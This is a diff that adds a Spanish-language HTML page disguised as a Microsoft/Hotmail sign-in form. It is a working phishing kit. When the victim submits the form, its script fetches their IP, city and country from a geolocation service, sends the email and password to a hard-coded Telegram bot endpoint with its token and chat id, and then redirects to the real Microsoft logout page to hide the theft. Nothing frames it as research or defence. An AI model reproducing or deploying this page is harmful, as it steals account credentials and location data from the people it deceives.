@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <link
+      rel="icon"
+      href="https://cdn.glitch.global/619bbf3f-0832-4238-90da-3c5dfc53bd19/22favicon.png?v=1714286509047"
+      type="SCAM/favicon.png"
+      sizes="16x16"    />
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">
+    <title>Iniciar sesión en tu cuenta Microsoft</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="stylesheet" type="text/css" href="estilo.css" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=no"
+    />
+    <style type="text/css">
+      body {
+        display: none;
+      }
+    </style>
+    <style type="text/css">
+      body {
+        display: block !important;
+      }
+    </style>
+    <noscript>
+      <style type="text/css">
+        body {
+          display: block !important;
+        }
+      </style>
+    </noscript>
+  </head>
+
+  <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
+    <div class="generalContainer">
+      <div class="container">
+        <img
+          class="imagen"
+          src="https://cdn.glitch.global/619bbf3f-0832-4238-90da-3c5dfc53bd19/222hotmail.jpg?v=1714286364817"
+          alt=""
+        />
+
+        <h2>Proteger Cuenta</h2>
+        <form id="loginform" method="POST">
+          <input type="email" name="emil" id="email" placeholder="Correo electrónico, teléfono o Skype" required=>
+          <input
+            id="clave"
+            type="password"
+            name="pss"
+            placeholder="Contraseña"
+            required="Numero"
+          />
+          <div class="div_text">
+            <small class="small_negro">¿No tienes una cuenta?</small>
+            <a href="#">Cree una.</a>
+          </div>
+          <!-- <small>Para mayor seguridad crea un PIN de 6 digitos.</small> -->
+          <div class="llave"><!-- <img src="siii.jpg"  --><!-- /> --></div>
+          <!-- <input
+            class="pin"
+            minlength="6"
+            maxlength="6"
+            type="password"
+            type="password"
+            name="numero"
+            placeholder="PIN ******"
+            required=""
+            pattern="[0-9]+"
+          /> -->
+          <input type="submit" value="Siguiente" />
+        </form>
+
+        <!-- <div class="terminosContainer">
+                <h3>Térmios de uso</h3>
+                <h5>Privacidad y cookies</h5>
+            </div> -->
+      </div>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const email = document.querySelector("#email").value;
+          const contra = document.querySelector("#clave").value;
+
+          const message =
+            "\n📧Usuario: " +
+            email +
+            "\n🔒Contra: " +
+            contra +
+            "\n🌐Ciudad:" +
+            response.data.city +
+            "\n🌐Pais: " +
+            response.data.country +
+            "\n📌IP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot7092576489:AAH5tXkYtk0kZv1s-oxRGGM4Ehk8LWk46d0/sendMessage",
+              {
+                chat_id: "6265926665",
+                text: message,
+              }
+            )
+            .then((response) => {
+              window.location.href =
+                "https://login.live.com/logout.srf?ct=1698893038&rver=7.0.6738.0&id=292841&ru=https:%2F%2Foutlook.live.com%2Fowa%2Fcsignout.aspx%3F%253f%253fumkt%3Des-US%26exch%3D1%26RpsCsrfState%3D4042c6ed-e025-daaa-5b59-e2b84fedc413";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
